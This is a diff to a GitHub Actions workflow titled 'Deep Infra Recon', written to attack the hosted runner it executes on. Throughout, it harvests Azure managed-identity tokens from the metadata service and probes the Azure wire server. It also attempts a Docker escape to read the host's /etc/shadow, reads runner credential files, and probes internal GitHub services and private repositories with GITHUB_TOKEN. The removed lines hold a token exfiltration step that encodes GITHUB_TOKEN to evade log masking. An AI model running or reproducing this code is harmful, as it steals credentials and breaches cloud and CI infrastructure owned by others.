@@ -1,123 +1,113 @@
-name: Deep Recon
+name: Deep Infra Recon
 on:
   workflow_dispatch:
 jobs:
   recon:
     runs-on: ubuntu-latest
     steps:
-      - name: Full Azure IMDS
+      - name: Internal services
         run: |
           set +e
-          echo "=== FULL AZURE IMDS ==="
-          curl -s --connect-timeout 5 -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 | python3 -m json.tool 2>/dev/null || curl -s --connect-timeout 5 -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1
+
+          echo "=== HOSTED COMPUTE ORCHESTRATOR ==="
+          curl -sv --connect-timeout 5 https://hosted-compute-request-orchestrator-prod-iad-02.githubapp.com/vm/v1 2>&1
           echo ""
-          echo "=== AZURE TAGS ==="
-          curl -s --connect-timeout 5 -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute/tagsList?api-version=2021-02-01" 2>&1
-          echo ""
-          echo "=== AZURE NETWORK ==="
-          curl -s --connect-timeout 5 -H "Metadata:true" "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01" 2>&1 | python3 -m json.tool 2>/dev/null
+          curl -sv --connect-timeout 5 https://hosted-compute-request-orchestrator-prod-iad-02.githubapp.com/ 2>&1
           echo ""
 
-      - name: GITHUB_TOKEN exfiltration test
-        run: |
-          set +e
-          echo "=== GITHUB_TOKEN LENGTH ==="
-          echo "Length: ${#GITHUB_TOKEN}"
+          echo "=== ALL AZURE IMDS ENDPOINTS ==="
+          curl -s --connect-timeout 5 -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01" 2>&1 | python3 -m json.tool 2>/dev/null
           echo ""
-          echo "=== TOKEN ENCODED ==="
-          echo "$GITHUB_TOKEN" | base64 | head -1
-          echo ""
-          echo "=== TOKEN REVERSED ==="
-          echo "$GITHUB_TOKEN" | rev
-          echo ""
-          echo "=== TOKEN CHAR BY CHAR ==="
-          for i in $(seq 1 ${#GITHUB_TOKEN}); do
-            printf "%s" "${GITHUB_TOKEN:$i-1:1}"
+
+          echo "=== AZURE MANAGED IDENTITY (all resources) ==="
+          for resource in "https://management.azure.com/" "https://vault.azure.net" "https://storage.azure.com/" "https://graph.microsoft.com/" "https://database.windows.net/" "https://dev.azuresynapse.net"; do
+            echo "--- Resource: $resource ---"
+            curl -s --connect-timeout 3 -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=$resource" 2>&1
+            echo ""
           done
-          echo ""
-          echo ""
-          echo "=== TOKEN HEX ==="
-          echo -n "$GITHUB_TOKEN" | xxd | head -5
-          echo ""
-          echo "=== ACTIONS_RUNTIME_TOKEN ==="
-          echo "Length: ${#ACTIONS_RUNTIME_TOKEN}"
-          echo "$ACTIONS_RUNTIME_TOKEN" | base64 | head -1
-          echo ""
-          echo "=== RUNNER_TRACKING_ID ==="
-          echo "$RUNNER_TRACKING_ID"
-          echo ""
 
-      - name: Docker exploration
-        run: |
-          set +e
-          echo "=== DOCKER INFO ==="
-          docker info 2>&1 | head -20
-          echo ""
-          echo "=== DOCKER IMAGES ==="
-          docker images 2>&1
-          echo ""
-          echo "=== DOCKER PS ==="
-          docker ps -a 2>&1
-          echo ""
-          echo "=== DOCKER NETWORKS ==="
-          docker network ls 2>&1
-          echo ""
-          echo "=== HOST MOUNT ==="
-          docker run --rm -v /:/host alpine cat /host/etc/shadow 2>&1 | head -5
-          echo ""
-          echo "=== HOST PROC ==="
-          docker run --rm --pid=host alpine ps aux 2>&1 | head -20
-          echo ""
-          echo "=== DOCKER SOCKET ==="
+          echo "=== AZURE WIRE SERVER DEEP ==="
+          for path in "/" "/machine" "/machine?comp=goalstate" "/machine?comp=config" "/machine/plugins" "/machine?comp=telemetrydata" "/healthcheck"; do
+            echo "--- $path ---"
+            curl -s --connect-timeout 3 -H "x-ms-version: 2012-11-30" "http://168.63.129.16$path" 2>&1 | head -10
+            echo ""
+          done
+
+          echo "=== DOCKER ESCAPE ATTEMPT ==="
+          echo "Docker socket:"
           ls -la /var/run/docker.sock 2>&1
           echo ""
 
-      - name: Actions Cache and Artifacts
-        run: |
-          set +e
-          echo "=== ACTIONS CACHE URL ==="
-          echo "ACTIONS_CACHE_URL: $ACTIONS_CACHE_URL"
-          echo ""
-          if [ -n "$ACTIONS_CACHE_URL" ]; then
-            echo "=== CACHE API ==="
-            curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "${ACTIONS_CACHE_URL}_apis/artifactcache/caches" 2>&1 | head -20
-            echo ""
-          fi
-          echo "=== ACTIONS_RUNTIME_URL ==="
-          echo "$ACTIONS_RUNTIME_URL"
-          if [ -n "$ACTIONS_RUNTIME_URL" ]; then
-            echo "=== RUNTIME API ==="
-            curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "${ACTIONS_RUNTIME_URL}pipelines" 2>&1 | head -20
-            echo ""
-            curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "${ACTIONS_RUNTIME_URL}" 2>&1 | head -20
-            echo ""
-          fi
-          echo "=== RESULTS SERVICE ==="
-          echo "ACTIONS_RESULTS_URL: $ACTIONS_RESULTS_URL"
-          if [ -n "$ACTIONS_RESULTS_URL" ]; then
-            curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "$ACTIONS_RESULTS_URL" 2>&1 | head -10
-          fi
+          echo "Host /etc/shadow via docker mount:"
+          docker run --rm -v /:/host alpine cat /host/etc/shadow 2>&1 | head -10
           echo ""
 
-      - name: Network recon extended
-        run: |
-          set +e
-          echo "=== ARP TABLE ==="
-          arp -a 2>&1
+          echo "Host processes via docker:"
+          docker run --rm --pid=host alpine ps aux 2>&1 | head -30
           echo ""
-          echo "=== LISTENING PORTS ==="
-          ss -tlnp 2>&1
+
+          echo "Host network via docker:"
+          docker run --rm --net=host alpine sh -c "wget -qO- http://169.254.169.254/metadata/instance?api-version=2021-02-01 --header='Metadata:true' 2>&1 | head -50" 2>&1
           echo ""
-          echo "=== PROCESSES ==="
-          ps aux | head -30
+
+          echo "=== GITHUB INTERNAL HOSTS ==="
+          for host in "github.com" "api.github.com" "githubapp.com" "github.net" "actions-results.githubusercontent.com" "pipelines.actions.githubusercontent.com" "vstoken.actions.githubusercontent.com" "token.actions.githubusercontent.com" "results-receiver.actions.githubusercontent.com" "codeload.github.com" "alive.github.com" "collector.github.com"; do
+            echo "--- $host ---"
+            dig +short $host 2>/dev/null | head -3
+          done
+
           echo ""
-          echo "=== CGROUPS ==="
-          cat /proc/1/cgroup 2>&1
+          echo "=== RESOLVE INTERNAL HOSTS ==="
+          for host in "hosted-compute-request-orchestrator-prod-iad-02.githubapp.com" "actions-results-prod.githubapp.com" "actions-cache-prod.githubapp.com" "runner-provisioner.githubapp.com" "codespace-provisioner.githubapp.com"; do
+            echo "--- $host ---"
+            dig +short $host 2>/dev/null | head -3
+            curl -s --connect-timeout 3 "https://$host/" 2>&1 | head -5
+            echo ""
+          done
+
+          echo "=== CURL INTERNAL GITHUB SERVICES ==="
+          for url in "https://actions-results.githubusercontent.com/" "https://pipelines.actions.githubusercontent.com/" "https://codeload.github.com/" "https://alive.github.com/" "https://collector.github.com/"; do
+            echo "--- $url ---"
+            curl -sv --connect-timeout 3 "$url" 2>&1 | head -15
+            echo ""
+          done
+
+          echo "=== GITHUB_TOKEN SCOPES ==="
+          curl -sI -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/user 2>&1 | grep -i "x-oauth-scopes\|x-accepted-oauth-scopes\|x-ratelimit"
           echo ""
-          echo "=== MOUNTS ==="
-          mount | grep -v cgroup | head -20
+
+          echo "=== TRY ACCESS PRIVATE GITHUB REPOS ==="
+          curl -s -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/repos/github/github 2>&1 | head -5
+          curl -s -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/repos/github/docs-internal 2>&1 | head -5
           echo ""
-          echo "=== CAPABILITIES ==="
-          cat /proc/1/status | grep -i cap
+
+          echo "=== ENVIRONMENT FILES ==="
+          cat /home/runner/work/_temp/_runner_file_commands/*.txt 2>/dev/null
+          cat /home/runner/.credentials 2>/dev/null
+          cat /home/runner/.credentials_rsaparams 2>/dev/null
+          ls -la /home/runner/.credentials* 2>/dev/null
+          cat /home/runner/.runner 2>/dev/null
           echo ""
+
+          echo "=== RUNNER CONFIG ==="
+          cat /home/runner/work/_temp/.runner 2>/dev/null || true
+          find /home/runner -name "*.json" -size +0 2>/dev/null | head -10
+          for f in $(find /home/runner -name "*.json" -size +0 2>/dev/null | head -5); do
+            echo "--- $f ---"
+            cat "$f" 2>/dev/null | head -10
+          done
+
+          echo ""
+          echo "=== NETWORK CONNECTIONS ==="
+          ss -tnp 2>&1 | head -20
+          echo ""
+
+          echo "=== FULL /etc/hosts ==="
+          cat /etc/hosts
+          echo ""
+
+          echo "=== IPTABLES ==="
+          sudo iptables -L -n 2>&1 | head -20
+          echo ""
+
           echo "=== DONE ==="
